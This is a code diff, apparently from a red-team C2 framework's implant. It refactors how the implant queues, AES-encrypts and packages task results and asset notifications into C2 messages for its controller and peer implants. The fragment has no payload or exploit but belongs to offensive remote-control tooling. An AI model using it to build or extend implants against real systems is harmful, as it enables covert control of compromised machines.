@@ -6,7 +6,6 @@ using System.Text;
 using System.Threading.Tasks;
 using DynamicEngLoading;
 using Engineer.Functions;
-using static System.Windows.Forms.VisualStyles.VisualStyleElement.TrackBar;
 
 namespace Engineer.Models
 {
@@ -19,22 +18,53 @@ namespace Engineer.Models
 
 		public abstract Task PostData();
 
-		internal ConcurrentQueue<EngineerTask> Inbound = new ConcurrentQueue<EngineerTask>();
-		internal ConcurrentQueue<EngineerTaskResult> Outbound = new ConcurrentQueue<EngineerTaskResult>();
-        internal ConcurrentQueue<byte[]> P2POutbound = new ConcurrentQueue<byte[]>();
+		internal ConcurrentQueue<EngineerTask> InboundTasks = new ConcurrentQueue<EngineerTask>();
+        internal ConcurrentQueue<AssetNotification> InboundNotifs = new ConcurrentQueue<AssetNotification>();
+        internal ConcurrentQueue<EngineerTaskResult> OutboundTaskResults = new ConcurrentQueue<EngineerTaskResult>();
+		internal ConcurrentQueue<AssetNotification> OutboundAssetNotifs = new ConcurrentQueue<AssetNotification>();
+
+		internal ConcurrentQueue<byte[]> P2POutbound = new ConcurrentQueue<byte[]>();
         internal EngineerMetadata engineerMetadata;
 
         public bool IsChildConnectedToParent { get; set; } // only used from a child in TCP & SMB, is true if its parent is still connected, false if not, used to issue check-in commands.
         public static int Sleep { get; set;}
-		internal IEnumerable<EngineerTaskResult> GetOutbound()
+		internal IEnumerable<C2Message> GetOutbound()
 		{
-			var outbound = new List<EngineerTaskResult>();
-			while (Outbound.TryDequeue(out var task))
+			var outbound = new List<C2Message>();
+			var outboundTasks = new List<EngineerTaskResult>();
+			var outboundAssetNotifs = new List<AssetNotification>();
+			while (OutboundTaskResults.TryDequeue(out var task))
 			{
-				outbound.Add(task);
+				outboundTasks.Add(task);
             }
-			//Console.WriteLine($"{DateTime.Now} removed {outbound.Count} tasks from queue");
-			return outbound;
+			//serialize the outbound tasks
+			if (outboundTasks.Any())
+			{
+                var message = new C2Message
+				{
+                    MessageType = 1,
+                    Data = Encryption.AES_Encrypt(outboundTasks.JsonSerialize(), "", Program.UniqueTaskKey),
+					PathMessage = new List<string> {Program._metadata.Id, Program.ImplantType }
+                };
+                outbound.Add(message);
+            }
+			while (OutboundAssetNotifs.TryDequeue(out var assetNotif))
+			{
+                outboundAssetNotifs.Add(assetNotif);
+            }
+			if (outboundAssetNotifs.Any())
+			{
+                var message = new C2Message
+				{
+                    MessageType = 2,
+                    Data = Encryption.AES_Encrypt(outboundAssetNotifs.JsonSerialize(), "", Program.UniqueTaskKey),
+					PathMessage =  new List<string> { Program._metadata.Id, Program.ImplantType }
+                };
+                outbound.Add(message);
+            }
+            //In the future this this where we can add calls for other message types
+
+            return outbound;
 		}
 
         internal List<byte[]> GetP2POutbound()
@@ -47,62 +77,40 @@ namespace Engineer.Models
 	        return P2POutboundList;
         }
 
-        public bool RecvData(out IEnumerable<EngineerTask> tasks)
-		{
-			if (Inbound.IsEmpty)
-			{
-				tasks = null;
-                return false;
-			}
-			var list = new List<EngineerTask>();
-
-			while (Inbound.TryDequeue(out var task))
-			{
-				list.Add(task);
-			}
-
-			tasks = list;
-			return true;
-
-		}
-
         public async Task CheckForDataProcess()
         {
-            var list = new List<EngineerTask>();
-            while (Inbound.TryDequeue(out var task))
+            var tasklist = new List<EngineerTask>();
+            while (InboundTasks.TryDequeue(out var task))
             {
-                list.Add(task);
+                tasklist.Add(task);
             }
-            Tasking.DealWithTasks(list);
+            Tasking.DealWithTasks(tasklist);
+            
+            var notiflist = new List<AssetNotification>();
+            while(InboundNotifs.TryDequeue(out var notif))
+            {
+                notiflist.Add(notif);
+            }
+            Tasking.HandleInboundNotifs(notiflist);
         }
 
         public void SentData(EngineerTaskResult result, bool isDataChunked)
 		{
-			var newResult = new EngineerTaskResult
-            {
-                Id = result.Id,
-                Command = result.Command,
-                Result = result.Result,
-                IsHidden = result.IsHidden,
-                Status = result.Status,
-                ImplantId = result.ImplantId,
-                ResponseType = result.ResponseType,
-            };
             if (isDataChunked)
             {
-				Outbound.Enqueue(newResult);
+				OutboundTaskResults.Enqueue(result);
 				return;
             }
-            //if the result is already in the Outbound queue then append the result to the existing result and update the status
-            if (Outbound.Any(t => t.Id == newResult.Id))
+            //if the result is already in the OutboundTaskResults queue then append the result to the existing result and update the status
+            if (OutboundTaskResults.Any(t => t.Id == result.Id))
 			{
-				var existingResult = Outbound.FirstOrDefault(t => t.Id == newResult.Id);
-				existingResult.Result = existingResult.Result.Concat(newResult.Result).ToArray();
-				existingResult.Status = newResult.Status;
+				var existingResult = OutboundTaskResults.FirstOrDefault(t => t.Id == result.Id);
+				existingResult.Result = existingResult.Result.Concat(result.Result).ToArray();
+				existingResult.Status = result.Status;
 			}
 			else
 			{
-				Outbound.Enqueue(newResult);
+				OutboundTaskResults.Enqueue(result);
 			}
         }
 
@@ -115,7 +123,6 @@ namespace Engineer.Models
 		public virtual void Init(EngineerMetadata engineermetadata)
 		{
 			engineerMetadata = engineermetadata;
-
 		}
 	}
 }
